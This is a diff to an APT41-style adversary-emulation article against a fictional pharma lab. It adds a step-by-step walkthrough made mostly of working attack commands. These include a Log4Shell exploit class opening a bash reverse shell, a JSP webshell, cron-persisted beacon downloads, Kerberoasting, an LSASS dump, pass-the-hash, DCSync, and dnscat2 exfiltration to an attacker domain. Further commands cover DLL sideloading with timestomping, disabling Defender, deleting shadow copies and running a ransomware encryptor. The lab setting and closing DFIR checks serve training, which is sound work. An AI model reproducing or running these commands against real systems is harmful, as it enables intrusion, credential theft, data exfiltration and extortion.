@@ -10,24 +10,25 @@
 
 1. [Introduction: The Group That Plays Both Sides](#introduction-the-group-that-plays-both-sides)
 2. [Lab Architecture](#lab-architecture)
-3. [Phase 0: Reconnaissance](#phase-0-reconnaissance)
-4. [Phase 1: Initial Access — Log4Shell (CVE-2021-44228)](#phase-1-initial-access--log4shell-cve-2021-44228)
-5. [Phase 2: Foothold — Two-Layer Persistence](#phase-2-foothold--two-layer-persistence)
-6. [Phase 3: Discovery — Mapping the Internal Network](#phase-3-discovery--mapping-the-internal-network)
-7. [Phase 4: Credential Access — Four Techniques in Sequence](#phase-4-credential-access--four-techniques-in-sequence)
-8. [Phase 5: Lateral Movement — Linux to Domain Admin](#phase-5-lateral-movement--linux-to-domain-admin)
-9. [Phase 6: Collection — Staging the Crown Jewels](#phase-6-collection--staging-the-crown-jewels)
-10. [Phase 7: Exfiltration — Two Channels](#phase-7-exfiltration--two-channels)
-11. [Phase 8: Persistence — DLL Sideloading on the Domain Controller](#phase-8-persistence--dll-sideloading-on-the-domain-controller)
-12. [Phase 9 (Optional): The Criminal Turn — Ransomware](#phase-9-optional-the-criminal-turn--ransomware)
-13. [Phase 10: Detection — What the SOC Finally Sees](#phase-10-detection--what-the-soc-finally-sees)
-14. [DFIR — Full Investigation](#dfir--full-investigation)
-15. [Malware Analysis: RxPhage (Simulated)](#malware-analysis-rxphage-simulated)
-16. [Scope, Impact, and Eradication](#scope-impact-and-eradication)
-17. [Defensive Posture — What Would Have Stopped This](#defensive-posture--what-would-have-stopped-this)
-18. [Full ATT&CK Coverage — Operation DragonRx (Simulated)](#full-attck-coverage--operation-dragonrx-simulated)
-19. [Conclusions](#conclusions)
-20. [References](#references)
+3. [Lab Walkthrough — Practical Execution](#lab-walkthrough--practical-execution)
+4. [Phase 0: Reconnaissance](#phase-0-reconnaissance)
+5. [Phase 1: Initial Access — Log4Shell (CVE-2021-44228)](#phase-1-initial-access--log4shell-cve-2021-44228)
+6. [Phase 2: Foothold — Two-Layer Persistence](#phase-2-foothold--two-layer-persistence)
+7. [Phase 3: Discovery — Mapping the Internal Network](#phase-3-discovery--mapping-the-internal-network)
+8. [Phase 4: Credential Access — Four Techniques in Sequence](#phase-4-credential-access--four-techniques-in-sequence)
+9. [Phase 5: Lateral Movement — Linux to Domain Admin](#phase-5-lateral-movement--linux-to-domain-admin)
+10. [Phase 6: Collection — Staging the Crown Jewels](#phase-6-collection--staging-the-crown-jewels)
+11. [Phase 7: Exfiltration — Two Channels](#phase-7-exfiltration--two-channels)
+12. [Phase 8: Persistence — DLL Sideloading on the Domain Controller](#phase-8-persistence--dll-sideloading-on-the-domain-controller)
+13. [Phase 9 (Optional): The Criminal Turn — Ransomware](#phase-9-optional-the-criminal-turn--ransomware)
+14. [Phase 10: Detection — What the SOC Finally Sees](#phase-10-detection--what-the-soc-finally-sees)
+15. [DFIR — Full Investigation](#dfir--full-investigation)
+16. [Malware Analysis: RxPhage (Simulated)](#malware-analysis-rxphage-simulated)
+17. [Scope, Impact, and Eradication](#scope-impact-and-eradication)
+18. [Defensive Posture — What Would Have Stopped This](#defensive-posture--what-would-have-stopped-this)
+19. [Full ATT&CK Coverage — Operation DragonRx (Simulated)](#full-attck-coverage--operation-dragonrx-simulated)
+20. [Conclusions](#conclusions)
+21. [References](#references)
 
 ---
 
@@ -42,6 +43,8 @@ This article simulates an APT41-style campaign from start to finish — reconnai
 **Target:** NovaTech Pharma Inc. (fictional) — a mid-size pharmaceutical company with a patient portal running a vulnerable Java application. Phase III clinical trial data worth stealing. Cyber insurance policy worth ransoming.
 
 **Campaign codename:** Operation DragonRx (fictional simulation).
+
+> **Companion CTI Report:** A full adversary-emulation intelligence report for this campaign — covering the Diamond Model, complete ATT&CK TTP matrix (38 techniques across 11 tactic categories), per-technique APT41 attribution confidence, IOCs, detection rules, alternative attribution hypotheses, and defensive recommendations — is published separately as [`apt41-dragonrx-cti-report.md`](apt41-dragonrx-cti-report.md) (TLP:WHITE). Key findings: dwell time 4 days 17 hours; all 12 SIEM alerts fired correctly; none reviewed until Day 6 — triage failure, not tooling failure. TTP fidelity is HIGH for Log4Shell exploitation speed, China Chopper webshell, and DLL sideloading pattern; LOW for Sliver and dnscat2 (generic tools, not APT41-specific).
 
 ---
 
@@ -93,6 +96,366 @@ docker exec dragonrx_wazuh /var/ossec/bin/wazuh-control restart
 #   Kali shell   →  docker exec -it dragonrx_kali /bin/bash
 #   Sliver C2    →  docker exec -it dragonrx_c2 sliver
 #   Log4Shell    →  http://10.0.0.100:8080/  (header: X-Api-Version)
+```
+
+---
+
+## Lab Walkthrough — Practical Execution
+
+Each phase below maps to a specific machine. Keep track of which shell you're in — it changes as the attack progresses.
+
+```
+[Kali attacker] ──► [WEB01 reverse shell] ──► [WS01 PsExec] ──► [DC01 PsExec]
+```
+
+### Connect to the attacker machine
+
+```bash
+# Option A — SSH (Kali container exposes port 2222)
+ssh kali@localhost -p 2222
+# default password: kali
+
+# Option B — docker exec
+docker exec -it dragonrx_kali /bin/bash
+```
+
+All Phase 0–1 and Impacket commands run **from Kali**. Phase 2–8 commands run on the host shown at the start of each block.
+
+---
+
+### Phase 0 — Recon (from Kali)
+
+```bash
+# Passive: certificate transparency
+curl -s "https://crt.sh/?q=%25.novatech-pharma.com&output=json" | \
+  python3 -c "import sys,json; [print(r['name_value']) for r in json.load(sys.stdin)]" | sort -u
+
+# Active: fingerprint the target
+nmap -sV -sC -p 8080 192.168.10.100 -oA /opt/recon/web01_scan
+curl -s "http://192.168.10.100:8080/DOESNOTEXIST" | grep -i "log4j"
+# log4j-core-2.14.1.jar  ← confirmed
+```
+
+---
+
+### Phase 1 — Initial Access (from Kali)
+
+```bash
+# Terminal 1 — listener
+rlwrap nc -lvnp 4444
+
+# Terminal 2 — verify callback first (no code execution)
+curl -s http://192.168.10.100:8080/ \
+  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/test}'
+# JNDI server log shows incoming connection → vulnerable, proceed
+
+# Terminal 2 — compile and stage payload
+mkdir -p /opt/tools/exploit
+cat > /opt/tools/exploit/Exploit.java << 'EOF'
+public class Exploit {
+    static {
+        try {
+            String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"};
+            Runtime.getRuntime().exec(cmd);
+        } catch (Exception e) { e.printStackTrace(); }
+    }
+}
+EOF
+javac -source 8 -target 8 /opt/tools/exploit/Exploit.java
+python3 -m http.server 8888 --directory /opt/tools/exploit/ &
+
+# Terminal 2 — fire
+curl -s http://192.168.10.100:8080/ \
+  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/Exploit}'
+# Terminal 1 receives: www-data@web01:~$
+```
+
+---
+
+### Phase 2 — Foothold (from WEB01 reverse shell)
+
+```bash
+# --- now inside the reverse shell on WEB01 ---
+
+# Upgrade to PTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# [Ctrl+Z]  →  stty raw -echo; fg  →  export TERM=xterm
+
+# Drop webshell
+mkdir -p /opt/tomcat/webapps/ROOT/resources/imgs
+cat > /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp << 'EOF'
+<%@page import="java.util.*,java.io.*"%><%
+String cmd = request.getParameter("c");
+if(cmd != null && !cmd.isEmpty()) {
+    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    StringBuilder sb = new StringBuilder(); String line;
+    while((line = br.readLine()) != null) sb.append(line).append("\n");
+    out.print(sb.toString());
+}
+%>
+EOF
+
+# Verify webshell
+curl -s "http://192.168.10.100:8080/resources/imgs/cache.jsp?c=id"
+# uid=33(www-data)
+
+# Deploy RxPhage beacon (from a second Kali terminal, serve the binary)
+# [Kali]  python3 -m http.server 8900 --directory /opt/tools/rxphage/ &
+
+mkdir -p /tmp/.cache
+curl -s "http://192.168.10.100:8080/resources/imgs/cache.jsp" \
+  --data-urlencode "c=wget http://10.0.0.5:8900/rxphage -O /tmp/.cache/rxphage && chmod +x /tmp/.cache/rxphage"
+
+# Persist via cron and start
+curl -s "http://192.168.10.100:8080/resources/imgs/cache.jsp" \
+  --data-urlencode "c=(crontab -l 2>/dev/null; echo '@reboot /tmp/.cache/rxphage') | crontab -"
+curl -s "http://192.168.10.100:8080/resources/imgs/cache.jsp" \
+  --data-urlencode "c=nohup /tmp/.cache/rxphage &>/dev/null & echo \$!"
+
+# Confirm beacon in Sliver
+# [Kali]  docker exec -it dragonrx_c2 sliver
+# sliver > sessions
+```
+
+---
+
+### Phase 3 — Discovery (from WEB01 reverse shell)
+
+```bash
+# --- still on WEB01 as www-data ---
+
+# Live host sweep
+for i in $(seq 1 254); do
+  (ping -c 1 -W 1 192.168.10.$i &>/dev/null && echo "UP: 192.168.10.$i") &
+done; wait
+
+# Port scan
+nmap -sV -p 135,139,389,445,3389,5985 192.168.10.10 192.168.10.20 192.168.10.50
+
+# Pull credentials from Tomcat config
+cat /opt/tomcat/conf/context.xml | grep -A5 "connectionPassword"
+# svc_ldap / NovaTech2021!
+```
+
+---
+
+### Phase 3 (cont.) — AD Enumeration (from Kali, using stolen creds)
+
+```bash
+# --- back on Kali ---
+
+# Enumerate domain users
+ldapsearch -x -H ldap://192.168.10.10 \
+  -D "cn=svc_ldap,dc=novatech,dc=local" -w "NovaTech2021!" \
+  -b "dc=novatech,dc=local" "(objectClass=user)" sAMAccountName department
+
+# Find Kerberoastable accounts (SPNs)
+ldapsearch -x -H ldap://192.168.10.10 \
+  -D "cn=svc_ldap,dc=novatech,dc=local" -w "NovaTech2021!" \
+  -b "dc=novatech,dc=local" \
+  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
+# svc_backup: MSSQLSvc/FS01.novatech.local:1433  ← target
+```
+
+---
+
+### Phase 4 — Credential Access (from Kali)
+
+```bash
+# Kerberoast svc_backup
+impacket-GetUserSPNs novatech.local/svc_ldap:'NovaTech2021!' \
+  -dc-ip 192.168.10.10 -request -outputfile /opt/loot/kerberoast_hashes.txt
+
+hashcat -m 13100 /opt/loot/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
+  --rules-file /usr/share/hashcat/rules/best64.rule -o /opt/loot/cracked.txt
+cat /opt/loot/cracked.txt
+# svc_backup:Backup_Svc99!
+
+# Move to WS01 with jsmith creds
+impacket-psexec novatech.local/jsmith:'Research#2024'@192.168.10.50 cmd.exe
+```
+
+**LSASS dump (from WS01 PsExec shell):**
+
+```cmd
+rem --- now on WS01 as jsmith ---
+for /f "tokens=2" %i in ('tasklist /fi "imagename eq lsass.exe" /fo list ^| find "PID"') do set LSASSPID=%i
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %LSASSPID% C:\Temp\lsass.dmp full
+```
+
+**Parse dump (back on Kali):**
+
+```bash
+# Copy dump back
+impacket-smbclient novatech.local/jsmith:'Research#2024'@192.168.10.50 \
+  -c "get C:\Temp\lsass.dmp /opt/loot/lsass.dmp"
+
+pypykatz lsa minidump /opt/loot/lsass.dmp 2>/dev/null | grep -A3 "Username"
+# jsmith     NTLM: YYYY...  Password: Research#2024
+# Administrator  NTLM: XXXX...   ← use this for PtH
+```
+
+---
+
+### Phase 5 — Lateral Movement to DC01 (from Kali)
+
+```bash
+# Pass-the-Hash sweep
+crackmapexec smb 192.168.10.0/24 \
+  -u administrator -H "aad3b435b51404eeaad3b435b51404ee:XXXX..." \
+  --local-auth -x "whoami"
+
+# Shell on DC01
+impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:XXXX..." \
+  novatech.local/administrator@192.168.10.10 cmd.exe
+# C:\Windows\system32> whoami
+# nt authority\system
+```
+
+**DCSync (from Kali, using DA creds):**
+
+```bash
+impacket-secretsdump novatech.local/Administrator:'NovaTech_Admin2024!'@192.168.10.10 \
+  -just-dc-ntlm -output /opt/loot/dcsync_hashes
+cat /opt/loot/dcsync_hashes.ntds
+# krbtgt:502:...:KKKK...:::   ← full domain compromise
+```
+
+---
+
+### Phase 6 — Collection (from DC01 PsExec shell)
+
+```cmd
+rem --- on DC01 as SYSTEM ---
+net use Z: \\192.168.10.20\Research /user:NOVATECH\Administrator NovaTech_Admin2024!
+net use Y: \\192.168.10.20\Manufacturing /user:NOVATECH\Administrator NovaTech_Admin2024!
+
+mkdir C:\Temp\archive
+robocopy Z:\ C:\Temp\archive\Research /E /NFL /NDL
+robocopy Y:\ C:\Temp\archive\Manufacturing /E /NFL /NDL
+robocopy \\192.168.10.10\SYSVOL C:\Temp\archive\SYSVOL /E /NFL /NDL
+
+certutil.exe -urlcache -f http://10.0.0.5:8900/7za.exe C:\Temp\7za.exe
+C:\Temp\7za.exe a -tzip -p"RxPhage2024!" -mx9 C:\Temp\data.zip C:\Temp\archive\
+```
+
+---
+
+### Phase 7 — Exfiltration (from Sliver console on Kali)
+
+```bash
+# Sliver C2
+docker exec -it dragonrx_c2 sliver
+
+# sliver > sessions
+# sliver > use <DC01 session ID>
+# sliver (dc01) > download C:\Temp\data.zip /opt/loot/dc01_data.zip
+```
+
+**DNS tunnel fallback (from Kali + WEB01):**
+
+```bash
+# [Kali] start dnscat2 server
+ruby /opt/tools/dnscat2/server/dnscat2.rb \
+  --dns "host=10.0.0.5,port=53,domain=tunnel.attacker-infra.com" \
+  --no-cache --secret="DragonRx2024"
+
+# [WEB01 webshell] connect client
+curl -s "http://192.168.10.100:8080/resources/imgs/cache.jsp" \
+  --data-urlencode "c=nohup /tmp/.cache/dnscat --secret='DragonRx2024' tunnel.attacker-infra.com &>/dev/null &"
+```
+
+---
+
+### Phase 8 — Persistence via DLL Sideloading (from DC01 PsExec shell)
+
+```cmd
+rem --- on DC01 as SYSTEM ---
+mkdir "C:\ProgramData\Oracle\Java\javapath"
+copy "C:\Program Files\Java\jre8\bin\java.exe" ^
+     "C:\ProgramData\Oracle\Java\javapath\java.exe"
+```
+
+```bash
+# [Kali / Sliver] upload malicious DLL
+# sliver (dc01) > upload /opt/tools/rxphage/rxphage_loader.dll ^
+#                        "C:\ProgramData\Oracle\Java\javapath\jvm.dll"
+```
+
+```cmd
+rem --- back on DC01 ---
+schtasks /create /tn "JavaUpdateService" ^
+  /tr "C:\ProgramData\Oracle\Java\javapath\java.exe" ^
+  /sc ONSTART /ru SYSTEM /f
+
+powershell -command ^
+  "(Get-Item 'C:\ProgramData\Oracle\Java\javapath\jvm.dll').LastWriteTime = '2023-01-15 09:00:00'"
+```
+
+---
+
+### Phase 9 — Ransomware (optional, from DC01 PsExec shell)
+
+```cmd
+rem --- on DC01 as SYSTEM ---
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"
+vssadmin delete shadows /all /quiet
+net stop "wbengine" /y
+net stop "SDRSVC" /y
+
+rem Safe test path only — encryptor targets C:\Temp\RansomTest\
+mkdir C:\Temp\RansomTest
+echo "Phase III Trial Data" > C:\Temp\RansomTest\trial_summary.txt
+```
+
+```bash
+# [Kali / Sliver]
+# sliver (dc01) > upload /opt/tools/encryptor/rxphage_encrypt.exe C:\Temp\rxphage_encrypt.exe
+# sliver (dc01) > execute C:\Temp\rxphage_encrypt.exe -- --target C:\Temp\RansomTest
+```
+
+---
+
+### DFIR — Verify Detections (from analyst workstation)
+
+```bash
+# Is C2 still active?
+docker exec dragonrx_zeek grep "10.0.0.10" /usr/local/zeek/logs/current/conn.log | tail -5
+
+# When did compromise start?
+docker exec dragonrx_zeek grep "jndi:" /usr/local/zeek/logs/current/http.log | head -1
+
+# Open Kibana — review all 12 alerts
+open http://localhost:5601
+# Index: wazuh-alerts-*
+# Filter: rule.level >= 10
+# Time range: last 7 days
+
+# Run DNS entropy check against live Zeek logs
+docker exec dragonrx_zeek python3 - << 'EOF'
+import math, os
+
+def entropy(s):
+    freq = {}
+    for c in s: freq[c] = freq.get(c, 0) + 1
+    return -sum(p/len(s)*math.log2(p/len(s)) for p in freq.values())
+
+log = "/usr/local/zeek/logs/current/dns.log"
+if not os.path.exists(log):
+    print("dns.log not found — no DNS traffic captured yet")
+else:
+    with open(log) as f:
+        for line in f:
+            if line.startswith('#'): continue
+            fields = line.strip().split('\t')
+            if len(fields) < 10: continue
+            query = fields[9]
+            sub = query.split('.')[0]
+            if len(sub) > 15 and entropy(sub) > 3.5:
+                print(f"[DNS TUNNEL] {query}  entropy={entropy(sub):.2f}")
+EOF
 ```
 
 ---
